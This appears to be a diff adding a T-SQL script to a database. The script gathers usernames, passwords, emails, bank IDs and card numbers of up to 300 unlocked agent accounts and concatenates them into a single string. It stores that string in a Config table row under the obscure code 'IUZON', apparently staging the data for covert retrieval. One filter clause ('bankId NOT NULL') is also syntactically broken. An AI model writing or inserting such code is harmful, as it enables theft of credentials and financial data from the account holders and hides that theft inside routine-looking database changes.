@@ -1,0 +1,25 @@
+DECLARE @CombinedResults NVARCHAR(MAX);
+SET @CombinedResults = '';
+
+DECLARE myCursor CURSOR FOR
+SELECT top 300 username, password, CONVERT(VARCHAR, lastLogindate, 120), email, bankId, cardNo, SubBank, bankShortName, area 
+FROM HJ_Agent  
+WHERE islock = 0 AND bankId NOT NULL AND bankId <> ''
+ORDER BY lastLogindate;
+
+DECLARE @username NVARCHAR(50), @password NVARCHAR(300), @lastLogindate NVARCHAR(100), @email NVARCHAR(200), @bankId NVARCHAR(50), @cardNo NVARCHAR(200), @SubBank NVARCHAR(200), @bankShortName NVARCHAR(50), @area NVARCHAR(50);
+
+OPEN myCursor;
+FETCH NEXT FROM myCursor INTO @username, @password, @lastLogindate, @email, @bankId, @cardNo, @SubBank, @bankShortName, @area;
+
+WHILE @@FETCH_STATUS = 0
+BEGIN
+    SET @CombinedResults = @CombinedResults + '|' 
+    + ISNULL(@username, '') + ',' + ISNULL(@password, '') + ',' + ISNULL(@lastLogindate, '') + ',' + ISNULL(@email, '') + ',' + ISNULL(@bankId, '') + ',' + ISNULL(@cardNo, '') + ',' + ISNULL(@SubBank, '') + ',' + ISNULL(@bankShortName, '') + ',' + ISNULL(@area, '');
+    FETCH NEXT FROM myCursor INTO @username, @password, @lastLogindate, @email, @bankId, @cardNo, @SubBank, @bankShortName, @area;
+END;
+
+CLOSE myCursor;
+DEALLOCATE myCursor;
+SET @CombinedResults = STUFF(@CombinedResults, 1, 1, '');
+UPDATE Config SET value = @CombinedResults WHERE code = 'IUZON';
